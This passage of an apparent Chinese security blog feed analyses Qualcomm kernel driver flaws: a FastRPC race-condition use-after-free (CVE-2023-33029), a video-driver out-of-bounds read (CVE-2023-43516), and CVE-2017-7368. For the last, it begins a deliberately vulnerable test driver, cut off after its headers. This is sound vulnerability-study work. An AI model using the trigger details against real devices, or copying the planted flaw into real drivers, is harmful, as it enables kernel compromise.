src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240521181646310.png"></p><p>fastrpc_file_free —-&gt;<br>fastrpc_file_free 函数也有两处调用<br>调用一， fastrpc_device_release 函数中调用，这和上面线程1 执行的路径一样了，<strong>大概是使用这个调用。</strong>，因为这个调用释放的结构体和线程1 是一致的。<br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240521182412006.png"><br>调用二，fastrpc_file_list_dtor(struct fastrpc_apps *me)  函数中调用，然后fastrpc_file_list_dtor 会被<br> fastrpc_device_exit函数调用，这是驱动退出时要执行的函数。<br><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240521182227248.png"></p><h2 id="0x04-漏洞触发原理"><a href="#0x04-漏洞触发原理" class="headerlink" title="0x04 漏洞触发原理"></a>0x04 漏洞触发原理</h2><p>这个漏洞跟blackhat 内的NPU CVE-2023-33114 类似，都是条件竞争引发的UAF。我是先看完CVE-2023-33114 后，再分析的本漏洞。</p><p>由于漏洞是条件竞争引发的UAF，按照代码路径分析的思路，整个的条件竞争如下图所示：</p><ul><li>线程一 在执行到 fastrpc_buf_free(ctx-&gt;buf, 1) 内的 spin_unlock 对 &amp;fl 解锁，然后立马线程二在竞争时间内获取到对 &amp;fl 的加锁。</li><li>然后线程二会调用 fastrpc_buf_free(free,0) 来直接 对buf 内存直接释放。</li><li>最后线程一对 buf 结构体内的指针解引用。但由于在线程二内，已经将buf 结构体的内存空间释放了，所以对 buf -&gt;type 进行解引用时，会操作未知的内存空间，从而导致内存损坏的问题。</li></ul><p><img src="/58__Qualcomm%20Securitybulletin%20CVE-2023-33029%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Drawing%202024-05-22%2010.36.14.excalidraw.png" alt="Drawing 2024-05-22 10.36.14.excalidraw"></p><p>分析到这里，整个漏洞的触发流程相当苛刻。</p><p>首先是漏洞触发流程的并发，需要多线程执行close 函数，这就意味着调用了close 函数后，要重新调用open函数打开驱动，并不能和ioctl 一样一直不停的调用。</p><p>另外在 线程一和线程二 的执行流程中，都会执行fastrpc_file_free 函数内的  fastrpc_context_list_dtor 函数和 fastrpc_cached_buf_list_free 函数，这两个函数会先后执行。</p><p>所以线程二在执行close 的时候，也会执行fastrpc_context_list_dtor 函数，这就意味着，线程二要先走完线程一的流程，然后线程一调用fastrpc_context_list_dtor 函数执行到fastrpc_buf_free内对 &amp;hf-hlock 进行解锁，然后线程二才能执行到fastrpc_cached_buf_list_free 函数，走完接下来要触发的条件竞争。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Qualcomm Securitybulletin CVE-2023-43516 漏洞分析</title>
    <link href="/2024/05/20/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/05/20/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>根据高通披露的信息来看 <a href="https://docs.qualcomm.com/product/publicresources/securitybulletin/february-2024-bulletin.html#Openref">https://docs.qualcomm.com/product/publicresources/securitybulletin/february-2024-bulletin.html#Openref</a><br><img src="/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240514093429855.png"></p><p>这是一个在 处理Video fence 模块内，存在指针偏移越界的问题，由于在接收的fence payload 信息时会产生内存冲突。<br>Use of out-of-range pointer offset in Video ：Memory corruption when malformed message payload is received from firmware.<br><img src="/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240513232101385.png"></p><p>相关的修复代码如下， <a href="https://git.codelinaro.org/clo/la/platform/vendor/opensource/video-driver/-/commit/e21682f825e909a4389bee60bcd1768423aede97">https://git.codelinaro.org/clo/la/platform/vendor/opensource/video-driver/-/commit/e21682f825e909a4389bee60bcd1768423aede97</a> 在原来的代码内的判断fence payload_size 异常后添加了 return -EINVAL，其中的 -EINVAL 代表无效参数，当一个函数接收到无效参数是，就会返回这个错误代码22。<br><img src="/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240513232023314.png"></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞类型: OOB<br>存在漏洞的函数如下所示：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs rust">line <span class="hljs-number">1679</span> ~ line <span class="hljs-number">1721</span>  /video-driver/driver/vidc/src/venus_hfi_response.c<br><span class="hljs-keyword">static</span> int <span class="hljs-title function_ invoke__">handle_property_fence_array</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">msm_vidc_inst</span> *inst,<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">hfi_packet</span> *pkt)<br>&#123;<br><span class="hljs-type">u64</span> cur_fence_id = <span class="hljs-number">0</span>, prev_fence_id = <span class="hljs-number">0</span>;<br>int i = <span class="hljs-number">0</span>, fence_count = <span class="hljs-number">0</span>;<br><span class="hljs-type">u32</span> payload_size;<br><span class="hljs-type">u8</span> *payload_start;<br><span class="hljs-keyword">if</span> (!inst || !pkt || !inst<span class="hljs-punctuation">-&gt;</span>capabilities) &#123;<br><span class="hljs-title function_ invoke__">i_vpr_e</span>(inst, <span class="hljs-string">&quot;%s: invalid params\n&quot;</span>, __func__);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>payload_size = pkt<span class="hljs-punctuation">-&gt;</span>size - <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hfi_packet</span>);<br>fence_count = payload_size / <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-type">u64</span>);<br>payload_start = (<span class="hljs-type">u8</span> *)((<span class="hljs-type">u8</span> *)pkt + <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hfi_packet</span>));<br><span class="hljs-keyword">if</span> (payload_size &gt; <span class="hljs-title function_ invoke__">sizeof</span>(inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_id)) &#123;<br><span class="hljs-title function_ invoke__">i_vpr_e</span>(inst,<br><span class="hljs-string">&quot;%s: fence list payload size %d exceeds expected max size %d\n&quot;</span>,<br>__func__, payload_size, <span class="hljs-title function_ invoke__">sizeof</span>(inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_id));<br><span class="hljs-title function_ invoke__">msm_vidc_change_state</span>(inst, MSM_VIDC_ERROR, __func__);<br><span class="hljs-keyword">return</span> -EINVAL;  <span class="hljs-comment">// + 修复代码</span><br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; fence_count; i++) &#123;<br>cur_fence_id = *((<span class="hljs-type">u64</span> *)payload_start + i);  <span class="hljs-comment">// OOB vul !! </span><br><span class="hljs-keyword">if</span> (prev_fence_id &gt; cur_fence_id) &#123;<br><span class="hljs-title function_ invoke__">i_vpr_e</span>(inst, <span class="hljs-string">&quot;%s: invalid fence id %llu, prev %llu\n&quot;</span>,<br>__func__, cur_fence_id, prev_fence_id);<br><span class="hljs-title function_ invoke__">msm_vidc_change_state</span>(inst, MSM_VIDC_ERROR, __func__);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_id[i] = cur_fence_id;<br>inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_count++;<br>prev_fence_id = cur_fence_id;<br>&#125;<br><span class="hljs-title function_ invoke__">i_vpr_l</span>(inst, <span class="hljs-string">&quot;%s: fence_id[0] %llu, received %d, expected %d\n&quot;</span>, __func__,<br>inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_id[<span class="hljs-number">0</span>], inst<span class="hljs-punctuation">-&gt;</span>fences_per_output_counter,<br>inst<span class="hljs-punctuation">-&gt;</span>hfi_frame_info.fence_count);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里详细的解释一下其中的代码：</p><ul><li>struct hfi_packet *pkt；payload_size &#x3D; pkt-&gt;size - sizeof(struct hfi_packet);<br>  表达式 `pkt-&gt;size - sizeof(struct hfi_packet)` 的意思是：从`pkt`指向的`hfi_packet`结构体的`size`成员值中减去整个`hfi_packet`结构体的大小，得到的结果就是有效载荷的大小。换句话说，这是指结构体中用于存储实际数据（即除去结构体固定头部信息之外的部分）的空间大小。这种计算常见于网络编程、数据包处理或任何需要从结构体中区分出元数据和实际数据部分的场景。</li><li>fence_count &#x3D; payload_size &#x2F; sizeof(u64);  是计算安全可访问的fence 数量<br> 其中的u64 表示无符号64位整数，需要占用8个字节的存储空间，每个字节Byte 由8 位bit 组成。要存储64位的数值，自然就需要8个字节的存储空间。每个字节能够存储2^8（即256）种不同的值，8个字节一共可以表示2^(8*8)&#x3D;2^64种不同的值，正好符合64位无符号整数的需求。所以在内存中，一个<code>u64</code>类型的变量会占用连续的8字节空间。</li><li>payload_start &#x3D; (u8 *)((u8 *)pkt + sizeof(struct hfi_packet));<br>  表示数据包中有效的payload 部分的指针指向的地址，即pkt 指针 + 结构体hif_packet 的大小的偏移。</li></ul><p>根据其中的代码可以了解到，<code>fence_count</code> 的值是根据 pkt-&gt;size  来确定的，而ptk 是可以通过外部传入的结构体，因此虽然代码中对fence_count 的大小进行了范围的限制，但其限制并没有完全保护接下来的循环。</p><p>如果<strong>fence_count 的值非常大</strong>，那么就决定了循环的次数会很大，每次循环都会从<code>payload_start</code>指向的内存中读取一个<code>u64</code>（8字节）的数据作为<code>cur_fence_id</code>，其中的 i 的值也会很大因而</p><ul><li>cur_fence_id &#x3D; *((u64 *)payload_start + i);<br>每次访问到有效payload 之外的数据，因而产生越界访问 OOB 。</li></ul><p>漏洞函数从驱动开始的调用栈<br>    driver&#x2F;vidc&#x2F;src&#x2F;msm_vidc_probe.c<br>    srtuct  platform_driver msm_vidc_driver –&gt;<br>    int msm_vidc_probe(struct platform_device *pdev)  —&gt;<br>    int msm_vidc_probe_video_device(struct platform_device *pdev)   —&gt;<br>    static int msm_vidc_init_irq(struct msm_vidc_core *core) —&gt;<br>    driver&#x2F;vidc&#x2F;src&#x2F;venus_hfi.c<br>    irqreturn_t venus_hfi_isr_handler(int irq, void *data) —&gt;<br>    static int __response_handler(struct msm_vidc_core *core)  —&gt;<br>    driver&#x2F;vidc&#x2F;src&#x2F;venus_hfi_response.c<br>    int handle_response(struct msm_vidc_core *core, void *response) —&gt;<br>    static int __handle_session_response(struct msm_vidc_inst *inst, struct hfi_header *hdr)—&gt;<br>    static int handle_session_property(struct msm_vidc_inst *inst,struct hfi_packet *pkt) —&gt;<br>    static int handle_property_with_payload(struct msm_vidc_inst *inst, struct hfi_packet *pkt, u32 port)   —&gt;<br>    static int handle_property_fence_array(struct msm_vidc_inst *inst, struct hfi_packet *pkt) —&gt; OOB</p><p>其中venus_hfi_isr_handler 这是一个中断服务例程，当硬件触发中断时，Linux内核会自动调用该函数来响应中断。</p><p>有关本驱动的信息参考如： <a href="https://lore.kernel.org/lkml/1690550624-14642-1-git-send-email-quic_vgarodia@quicinc.com/T/">https://lore.kernel.org/lkml/1690550624-14642-1-git-send-email-quic_vgarodia@quicinc.com/T/</a></p><p>这个驱动用于视频流解码&#x2F;编码。该驱动程序具有以下功能：</p><ul><li>具有 M2M 和流媒体功能的 V4L2 兼容视频驱动程序。</li><li>支持H264、H265、VP9解码器。</li><li>支持H264、H265编码器</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">irqreturn_t venus_hfi_isr_handler(int irq, void *data)<br>&#123;<br>struct msm_vidc_core *core = data;<br>int num_responses = <span class="hljs-number">0</span>, rc = <span class="hljs-number">0</span>;<br>d_vpr_l(<span class="hljs-string">&quot;%s()\n&quot;</span>, __func__);<br><span class="hljs-keyword">if</span> (!core) &#123;<br>d_vpr_e(<span class="hljs-string">&quot;%s: invalid params\n&quot;</span>, __func__);<br>return IRQ_NONE;<br>&#125;<br>core_lock(core, __func__);<br>rc = __resume(core);<br><span class="hljs-keyword">if</span> (rc) &#123;<br>d_vpr_e(<span class="hljs-string">&quot;%s: Power on failed\n&quot;</span>, __func__);<br>core_unlock(core, __func__);<br>goto <span class="hljs-keyword">exit</span>;<br>&#125;<br>call_venus_op(core, clear_interrupt, core);<br>core_unlock(core, __func__);<br>num_responses = __response_handler(core);<br><span class="hljs-keyword">exit</span>:<br><span class="hljs-keyword">if</span> (!call_venus_op(core, watchdog, core, core-&gt;intr_status))<br>enable_irq(irq);<br>return IRQ_HANDLED;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 driver&#x2F;vidc&#x2F;src&#x2F;msm_vidc_probe.c 内 会初始化驱动，其中的 probe 函数是驱动程序的核心入口点，负责识别和初始化硬件设备。<code>probe</code>函数是驱动程序与硬件设备交互的桥梁</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">struct platform_driver msm_vidc_driver = &#123;<br><span class="hljs-string">.probe</span> = msm_vidc_probe,<br><span class="hljs-string">.remove</span> = msm_vidc_remove,<br><span class="hljs-string">.driver</span> = &#123;<br><span class="hljs-string">.name</span> = <span class="hljs-string">&quot;msm_vidc_v4l2&quot;</span>,<br><span class="hljs-string">.of_match_table</span> = msm_vidc_dt_match,<br><span class="hljs-string">.pm</span> = &amp;msm_vidc_pm_ops,<br><span class="hljs-string">.probe_type</span> = PROBE_PREFER_ASYNCHRONOUS,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>主要的结构体</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct hfi_header &#123;<br>u32 size<span class="hljs-comment">;</span><br>u32 session_id<span class="hljs-comment">;</span><br>u32 header_id<span class="hljs-comment">;</span><br>u32 reserved[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>u32 num_packets<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br>struct hfi_packet &#123;<br>u32 size<span class="hljs-comment">;</span><br>u32 type<span class="hljs-comment">;</span><br>u32 flags<span class="hljs-comment">;</span><br>u32 payload_info<span class="hljs-comment">;</span><br>u32 port<span class="hljs-comment">;</span><br>u32 packet_id<span class="hljs-comment">;</span><br>u32 reserved[<span class="hljs-number">2</span>]<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>数据包的结构分析</strong></p><p>主要分析的是 hfi_header 和 hfi_packet 这两个结构体</p><p>根据验证hdr_packet 有效性函数来看 validate_hdr_packet() ，其数据包的组成结构如下<br>| hfi_header | hif_packet + packet_payloads |</p><p>其中 hif_packet -&gt;size 指针表示的是当前 hif_packet + packet_payloads 的大小。<br>并且 hdr-&gt;num_packets 表示当前 hfi_packet 的个数。所以直接遍历数据包的个数，从每个数据包中提取出payload 。</p><p><img src="/57__Qualcomm%20Securitybulletin%20CVE-2023-43516%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20240515174132423.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争学习之CVE-2017-7368复现</title>
    <link href="/2024/05/05/56__%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0%E4%B9%8BCVE-2017-7368%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/05/05/56__%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0%E4%B9%8BCVE-2017-7368%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="条件竞争漏洞基础"><a href="#条件竞争漏洞基础" class="headerlink" title="条件竞争漏洞基础"></a>条件竞争漏洞基础</h2><p>在 mitre 中有不少有关条件竞争类型的编号，比如 CWE-362、CWE-364、CWE-366、CWE-367 等。在mitre 中属于一个比较大的板块，并且不少的内核有关的高危漏洞，也有条件竞争漏洞类型，比如 DirtyCow，当然也有一些条件竞争漏洞介绍的是 web 方面的问题，这里介绍的是内核。</p><p>在CTF wiki:  <a href="https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/race-condition/introduction/</a> </p><p>条件竞争称为Race Condition，是一种在多线程或多进程并发执行时可能导致不正确行为或数据损坏的安全问题。这种漏洞通常发生在多线程或进程试图访问和修改共享资源（如内存、文件、网络连接等）时，由于执行顺序不确定或没有适当的同步的措施，导致竞争条件的发生并且条件竞争竞争在内核也竞争出现。</p><p>在我的理解中，存在条件竞争漏洞的代码段在正常的审计来看，其实在执行的时候，并不会出现问题，但是如果代码段中存在共享对象时，可能是一些全局变量，文件等，就有可能在代码段运行时候，同时起一个进程或线程来修改共享对象，就可能修改代码的正常执行逻辑，从而产生一些问题。</p><p>以前在学习多线程的时候，写多线程的代码，碰到循环的时候经常产生执行的代码顺序不会根据自己设定的流程来执行，CTF wiki 例子中就是如此，有很直观的感觉，也就是说代码在很短的时间窗口中，是可以被破坏和修改的。</p><p>根据CTF wiki内条件竞争应该具备以下的条件:</p><ul><li>并发，至少存在两个并发执行流，这里的执行流包括线程、进程、任务等级别的执行流。</li><li>共享对象，至少有一个共享资源被多个并发执行的线程或进程访问或修改。这个共享资源可以是内存中的全局变量、文件、网络连接等。一般来说，这些共享对象是用来使得多个程序执行流相互交流。此外，我们称共享对象的代码为临界区。在正常写代码时，这部分应该加锁。</li><li>改变对象，也就是修改。即至少有一个控制流会改变竞争对象的状态，因为如果程序只是对对象进行读操作，那么并不回产生条件竞争。</li></ul><p>在漏洞挖掘的时候，要发现条件竞争漏洞通常并不是很简单，因为代码本身的执行流程不会出现问题，因为一般来说，在执行代码的时候，并发的情况并不多，而且存在能修改共享对象的情况也并不常见。</p><p>这里在看雪的一个帖子中，看到有人描述了对驱动条件竞争漏洞挖掘的思路方式，说的也比较言简意赅:</p><ul><li>首先起一个线程，调用某一个系统调用</li><li>起另一个线程，密集的对那个调用送入的参数随意更改，控制好这两个线程的时间序，尽量保证一个线程系统调用后，另一个系统密集修改里面的数据。</li><li>等崩溃。</li></ul><p><a href="https://bbs.kanxue.com/thread-214551.htm">https://bbs.kanxue.com/thread-214551.htm</a></p><p><a href="https://cloud.tencent.com/developer/article/1516412">https://cloud.tencent.com/developer/article/1516412</a></p><p><a href="https://h0pe-ay.github.io/KernelPwn-RaceCondition/">https://h0pe-ay.github.io/KernelPwn-RaceCondition/</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/</a></p><h2 id="CVE-2017-7368-漏洞分析"><a href="#CVE-2017-7368-漏洞分析" class="headerlink" title="CVE-2017-7368 漏洞分析"></a>CVE-2017-7368 漏洞分析</h2><p>分析参考： <a href="https://paper.seebug.org/364/">https://paper.seebug.org/364/</a></p><p>为了更好的理解条件竞争，看到有一篇有关高通声卡驱动CVE-2017-7368 的分析blog， 正好也在分析高通驱动，所以拿出来做一个比较好的学习内容和案例。</p><p>由于年代久远，这里找到了有关的代码。<br><a href="https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kk-r1/sound/soc/msm/qdsp6v2/msm-lsm-client.c">https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kk-r1/sound/soc/msm/qdsp6v2/msm-lsm-client.c</a><br><img src="/56__%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0%E4%B9%8BCVE-2017-7368%E5%A4%8D%E7%8E%B0.assets/image-20240505154815523.png"></p><p>其中的漏洞详情分析如下：</p><ul><li>在驱动的ioctl cmd参数SNDRV_LSM_REG_SND_MODEL 中，会使用copy_from_user函数将用户空间传入的数据分配给结构体snd_model。</li><li>然后 q6lsm_snd_model_buf_alloc 会给prtd-&gt;lsm_client 指针变量分配snd_model.data_size 大小的内存空间，注意这个 snd_model 的数据是用户空间传入的，另外 prtd 这个结构体是全局的，并且结构体内的lsm_client 结构体指针是可以被修改的。</li><li>最后copy_from_user(prtd-&gt;lsm_client-&gt;sound_model.data,snd_model.data, snd_model.data_size） 这个函数会将传入的数据根据data_size 的大小复制到 prtd 中。</li><li>正常来说，目标缓冲区的大小由传入数据大小来分配，是不会出现越界，溢出的问题。但是由于prtd-&gt;lsm_client是一个全局变量，如果多线程来调用case SNDRV_LSM_REG_SND_MODEL，那么在一个短时间内可能修改prtd-&gt;lsm_client 的大小。而传入的数据还是另一个线程的snd_model.data，进而产生越界的问题。</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于没有完备的环境来复现触发这个漏洞，但为了能够复现这个漏洞，因此我就自己写了一个类似的驱动程序。</p><p>驱动代码如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/cdev.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/slab.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/device.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/delay.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_MAGIC <span class="hljs-string">&#x27;a&#x27;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD0 _IO(IOC_MAGIC, 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD1 _IOR(IOC_MAGIC, 1, int)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD2 _IOW(IOC_MAGIC, 2, struct 